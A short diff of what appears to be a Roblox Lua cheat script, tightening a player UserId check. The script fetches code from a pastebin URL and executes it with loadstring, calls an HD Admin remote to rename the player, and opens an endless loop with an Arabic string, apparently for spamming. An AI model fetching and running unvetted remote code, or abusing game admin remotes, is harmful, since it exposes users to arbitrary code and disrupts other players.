@@ -1,6 +1,6 @@
 local GUI = loadstring(game:HttpGet("https://pastebin.com/raw/meUSVUyQ"))()
 local speaker = game.Players.LocalPlayer
-if speaker.UserId == "2842627100" or "3933589916" then
+if speaker.UserId == "2842627100" then
     game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Name me znobte not snobe")
     while wait() do 
         local A_1 = "اخلاط عمي اهههههههه"
